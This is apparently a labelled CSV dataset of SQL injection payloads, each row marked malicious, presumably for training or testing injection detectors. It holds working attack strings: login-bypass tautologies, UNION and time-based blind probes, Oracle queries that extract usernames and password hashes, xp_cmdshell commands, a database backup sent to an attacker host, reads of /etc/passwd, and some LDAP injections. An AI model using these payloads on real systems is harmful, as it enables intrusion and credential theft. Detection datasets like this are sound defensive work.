,payload,is_malicious,injection_type
2160,"' exec sp_addsrvrolemember 'name' , 'sysadmin' --",1,SQL
2161,"' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",1,SQL
2162,' grant connect to name; grant resource to name; --,1,SQL
2163,"' insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",1,SQL
2164,' or 1=1 --,1,SQL
2165,' union (select @@version) --,1,SQL
2166,"' union (select NULL, (select @@version)) --",1,SQL
2167,"' union (select NULL, NULL, (select @@version)) --",1,SQL
2168,"' union (select NULL, NULL, NULL,  (select @@version)) --",1,SQL
2169,"' union (select NULL, NULL, NULL, NULL,  (select @@version)) --",1,SQL
2170,"' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --",1,SQL
2171,"'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --",1,SQL
2172,"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",1,SQL
2173,"'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",1,SQL
2174,"'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --",1,SQL
2175,'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1,SQL
2176,'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,1,SQL
2177,'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,1,SQL
2178,'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,1,SQL
2179,1 exec sp_ (or exec xp_),1,SQL
2180,1 and 1=1,1,SQL
2181,1' and 1=(select count(*) from tablenames); --,1,SQL
2182,1 or 1=1,1,SQL
2183,1' or '1'='1,1,SQL
2184,1or1=1,1,SQL
2185,1'or'1'='1,1,SQL
2186,fake@ema'or'il.nl'='il.nl,1,SQL
2187,1 and user_name() = 'dbo',1,SQL
2188,'; desc users; --,1,SQL
2189,1\'1,1,SQL
2190,1' and non_existant_table = '1,1,SQL
2191,' or username is not NULL or username = ',1,SQL
2192,"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",1,SQL
2193,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",1,SQL
2194,1 uni/**/on select all from where,1,SQL
2195,’ or ‘1’=’1,1,SQL
2196,' or '1'='1,1,SQL
2197,'||utl_http.request('httP://192.168.1.1/')||',1,SQL
2198,"' || myappadmin.adduser('admin', 'newpass') || '",1,SQL
2199,' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i,1,SQL
2200,' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i,1,SQL
2201,' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i,1,SQL
2202,' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i,1,SQL
2203,' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,1,SQL
2204,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i,1,SQL
2205,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i,1,SQL
2206,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i,1,SQL
2207,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,1,SQL
2208,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i,1,SQL
2209,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",1,SQL
2210,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",1,SQL
2211,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i",1,SQL
2212,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",1,SQL
2213,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i",1,SQL
2214,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i",1,SQL
2215,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i",1,SQL
2216,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",1,SQL
2217,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i",1,SQL
2218,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i",1,SQL
2219,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",1,SQL
2220,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1,SQL
2221,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",1,SQL
2222,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i",1,SQL
2223,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i",1,SQL
2224,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",1,SQL
2225,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i",1,SQL
2226,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",1,SQL
2227,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i",1,SQL
2228,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i",1,SQL
2229,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i",1,SQL
2230,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i",1,SQL
2231,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",1,SQL
2232,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i",1,SQL
2233,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i",1,SQL
2234,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i",1,SQL
2235,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",1,SQL
2236,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i",1,SQL
2237,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i",1,SQL
2238,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i",1,SQL
2239,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",1,SQL
2240,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",1,SQL
2241,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",1,SQL
2242,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",1,SQL
2243,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",1,SQL
2244,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",1,SQL
2245,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",1,SQL
2246,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",1,SQL
2247,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",1,SQL
2248,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",1,SQL
2249,"<>""'%;)(&+",1,SQL
2250,0 or 1=1,1,SQL
2251,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1,SQL
2252,0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A,1,SQL
2253,0x77616974666F722064656C61792027303A303A31302700 exec(@s),1,SQL
2254,"1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",1,SQL
2255,1 or 1=1,1,SQL
2256,1;SELECT%20*,1,SQL
2257,1 waitfor delay '0:0:10'--,1,SQL
2258,'%20or%20''=',1,SQL
2259,'%20or%201=1,1,SQL
2260,')%20or%20('x'='x,1,SQL
2261,'%20or%20'x'='x,1,SQL
2262,%20or%20x=x,1,SQL
2263,%20'sleep%2050',1,SQL
2264,%20$(sleep%2050),1,SQL
2265,%21,1,SQL
2266,23 OR 1=1,1,SQL
2267,%26,1,SQL
2268,%27%20or%201=1,1,SQL
2269,%28,1,SQL
2270,%29,1,SQL
2271,%2A%28%7C%28mail%3D%2A%29%29,1,SQL
2272,%2A%28%7C%28objectclass%3D%2A%29%29,1,SQL
2273,%2A%7C,1,SQL
2274,'||'6,1,SQL
2275,(||6),1,SQL
2276,%7C,1,SQL
2277,admin' or ',1,SQL
2278,"' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",1,SQL
2279,' and 1 in (select var from temp)--,1,SQL
2280,anything' OR 'x'='x,1,SQL
2281,"""a"""" or 1=1--""",1,SQL
2282,a' or 1=1--,1,SQL
2283,"""a"""" or 3=3--""",1,SQL
2284,a' or 3=3--,1,SQL
2285,a' or 'a' = 'a,1,SQL
2286,&apos;%20OR,1,SQL
2287,a' waitfor delay '0:0:10'--,1,SQL
2288,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,1,SQL
2289,bfilename,1,SQL
2290,char%4039%41%2b%40SELECT,1,SQL
2291,declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),1,SQL
2292,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1,SQL
2293,declare @q nvarchar (4000) select @q =,1,SQL
2294,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1,SQL
2295,declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),1,SQL
2296,declare @s varchar(22) select @s =,1,SQL
2297,declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,1,SQL
2298,"'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",1,SQL
2299,'; exec master..xp_cmdshell,1,SQL
2300,'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1,SQL
2301,exec(@s),1,SQL
2302,'; exec ('sel' + 'ect us' + 'er'),1,SQL
2303,exec sp,1,SQL
2304,'; execute immediate 'sel' || 'ect us' || 'er',1,SQL
2305,exec xp,1,SQL
2306,'; exec xp_regread,1,SQL
2307,' group by userid having 1=1--,1,SQL
2308,' having 1=1--,1,SQL
2309,"hi or 1=1 --""",1,SQL
2310,hi' or 1=1 --,1,SQL
2311,"""hi"""") or (""""a""""=""""a""",1,SQL
2312,hi or a=a,1,SQL
2313,hi' or 'a'='a,1,SQL
2314,hi') or ('a'='a,1,SQL
2315,'hi' or 'x'='x';,1,SQL
2316,*(|(mail=*)),1,SQL
2317,*(|(objectclass=*)),1,SQL
2318,' or ''=',1,SQL
2319,"or 0=0 #""",1,SQL
2320,' or 0=0 --,1,SQL
2321,' or 0=0 #,1,SQL
2322,""" or 0=0 --",1,SQL
2323,or 0=0 --,1,SQL
2324,or 0=0 #,1,SQL
2325,' or 1 --',1,SQL
2326,' or 1/*,1,SQL
2327,; or '1'='1',1,SQL
2328,' or '1'='1,1,SQL
2329,' or '1'='1'--,1,SQL
2330,' or 1=1,1,SQL
2331,' or 1=1 /*,1,SQL
2332,' or 1=1--,1,SQL
2333,' or 1=1--,1,SQL
2334,'/**/or/**/1/**/=/**/1,1,SQL
2335,‘ or 1=1 --,1,SQL
2336,""" or 1=1--",1,SQL
2337,or 1=1,1,SQL
2338,or 1=1--,1,SQL
2339,"or 1=1 or """"=",1,SQL
2340,' or 1=1 or ''=',1,SQL
2341,' or 1 in (select @@version)--,1,SQL
2342,or%201=1,1,SQL
2343,or%201=1 --,1,SQL
2344,' or 2 > 1,1,SQL
2345,' or 2 between 1 and 3,1,SQL
2346,' or 3=3,1,SQL
2347,‘ or 3=3 --,1,SQL
2348,' or '7659'='7659,1,SQL
2349,or a=a,1,SQL
2350,or a = a,1,SQL
2351,' or 'a'='a,1,SQL
2352,' or a=a--,1,SQL
2353,') or ('a'='a,1,SQL
2354,""" or ""a""=""a",1,SQL
2355,) or (a=a,1,SQL
2356,order by,1,SQL
2357,' or (EXISTS),1,SQL
2358,or isNULL(1/0) /*,1,SQL
2359,""" or isNULL(1/0) /*",1,SQL
2360,' or 'something' like 'some%',1,SQL
2361,' or 'something' = 'some'+'thing',1,SQL
2362,' or 'text' = n'text',1,SQL
2363,' or 'text' > 't',1,SQL
2364,' or uid like '%,1,SQL
2365,' or uname like '%,1,SQL
2366,' or 'unusual' = 'unusual',1,SQL
2367,' or userid like '%,1,SQL
2368,' or user like '%,1,SQL
2369,' or username like '%,1,SQL
2370,' or username like char(37);,1,SQL
2371,' or 'whatever' in ('whatever'),1,SQL
2372,' -- &password=,1,SQL
2373,password:*/=1--,1,SQL
2374,PRINT @@variable,1,SQL
2375,' select * from information_schema.tables--,1,SQL
2376,' select name from syscolumns where id = (select id from sysobjects where name = tablename')--,1,SQL
2377,' (select top 1,1,SQL
2378,--sp_password,1,SQL
2379,'sqlattempt1,1,SQL
2380,(sqlattempt2),1,SQL
2381,'sqlvuln,1,SQL
2382,'+sqlvuln,1,SQL
2383,(sqlvuln),1,SQL
2384,sqlvuln;,1,SQL
2385,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,SQL
2386,to_timestamp_tz,1,SQL
2387,' UNION ALL SELECT,1,SQL
2388,' union all select @@version--,1,SQL
2389,' union select,1,SQL
2390,uni/**/on sel/**/ect,1,SQL
2391,' UNION SELECT,1,SQL
2392,"' union select 1,load_file('/etc/passwd'),1,1,1;",1,SQL
2393,) union select * from information_schema.tables;,1,SQL
2394,"' union select * from users where login = char(114,111,111,116);",1,SQL
2395,'||UTL_HTTP.REQUEST,1,SQL
2396,",@variable",1,SQL
2397,@variable,1,SQL
2398,@var select @var as var into temp end --,1,SQL
2399,x27UNION SELECT,1,SQL
2400,x' AND 1=(SELECT COUNT(*) FROM tabname); --,1,SQL
2401,x' AND email IS NULL; --,1,SQL
2402,x' AND members.email IS NULL; --,1,SQL
2403,x' AND userid IS NULL; --,1,SQL
2404,x' or 1=1 or 'x'='y,1,SQL
2405,x' OR full_name LIKE '%Bob%,1,SQL
2406,ý or 1=1 --,1,SQL
2407,"select versionnumber, version_timestamp from sysibm.sysversions;",1,SQL
2408,select user from sysibm.sysdummy1;,1,SQL
2409,select session_user from sysibm.sysdummy1;,1,SQL
2410,select system_user from sysibm.sysdummy1;,1,SQL
2411,select current server from sysibm.sysdummy1;,1,SQL
2412,select name from sysibm.systables;,1,SQL
2413,select grantee from syscat.dbauth;,1,SQL
2414,select * from syscat.tabauth;,1,SQL
2415,select * from syscat.dbauth where grantee = current user;,1,SQL
2416,select * from syscat.tabauth where grantee = current user;,1,SQL
2417,"select name, tbname, coltype from sysibm.syscolumns;",1,SQL
2418,SELECT schemaname FROM syscat.schemata;,1,SQL
2419,select @@version,1,SQL
2420,select @@servernamee,1,SQL
2421,select @@microsoftversione,1,SQL
2422,select * from master..sysserverse,1,SQL
2423,select * from sysusers,1,SQL
2424,exec master..xp_cmdshell 'ipconfig+/all',1,SQL
2425,exec master..xp_cmdshell 'net+view',1,SQL
2426,exec master..xp_cmdshell 'net+users',1,SQL
2427,exec master..xp_cmdshell 'ping+<attackerip>',1,SQL
2428,BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat',1,SQL
2429,"create table myfile (line varchar(8000))"" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspâ'"" select * from myfile""--",1,SQL
2430,<username>' OR 1=1--,1,SQL
2431,'OR '' = ',1,SQL
2432,<username>'--,1,SQL
2433,"' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--",1,SQL
2434,'OR 1=1--,1,SQL
2435,create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;,1,SQL
2436,select version();,1,SQL
2437,select current_database();,1,SQL
2438,select current_user;,1,SQL
2439,select session_user;,1,SQL
2440,select current_setting('log_connections');,1,SQL
2441,select current_setting('log_statement');,1,SQL
2442,select current_setting('port');,1,SQL
2443,select current_setting('password_encryption');,1,SQL
2444,select current_setting('krb_server_keyfile');,1,SQL
2445,select current_setting('virtual_host');,1,SQL
2446,select current_setting('port');,1,SQL
2447,select current_setting('config_file');,1,SQL
2448,select current_setting('hba_file');,1,SQL
2449,select current_setting('data_directory');,1,SQL
2450,select * from pg_shadow;,1,SQL
2451,select * from pg_group;,1,SQL
2452,create table myfile (input TEXT);,1,SQL
2453,copy myfile from '/etc/passwd';,1,SQL
2454,select * from myfile;copy myfile to /tmp/test;,1,SQL
2455,)%20waitfor%20delay%20'0:0:20'%20/*,1,SQL
2456,)%20waitfor%20delay%20'0:0:20'%20--,1,SQL
2457,')%20waitfor%20delay%20'0:0:20'%20/*,1,SQL
2458,')%20waitfor%20delay%20'0:0:20'%20--,1,SQL
2459,""")%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2460,""")%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2461,))%20waitfor%20delay%20'0:0:20'%20/*,1,SQL
2462,))%20waitfor%20delay%20'0:0:20'%20--,1,SQL
2463,'))%20waitfor%20delay%20'0:0:20'%20/*,1,SQL
2464,'))%20waitfor%20delay%20'0:0:20'%20--,1,SQL
2465,"""))%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2466,"""))%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2467,",NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2468,",NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2469,"',NULL)%20waifor%20delay%20'0:0:20'%20/*",1,SQL
2470,"',NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2471,""",NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2472,""",NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2473,"),NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2474,"),NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2475,"'),NULL)%20waifor%20delay%20'0:0:20'%20/*",1,SQL
2476,"'),NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2477,"""),NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2478,"""),NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2479,",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2480,",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2481,"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2482,"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2483,""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2484,""",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2485,"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2486,"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2487,"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2488,"'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2489,"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2490,"""),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2491,",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2492,",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2493,"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2494,"',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2495,""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2496,""",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2497,"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2498,"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2499,"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2500,"'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2501,"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2502,"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2503,",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2504,",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2505,"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2506,"',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2507,""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2508,""",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2509,"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2510,"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2511,"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2512,"'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2513,"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
2514,"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,SQL
2515,",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,SQL
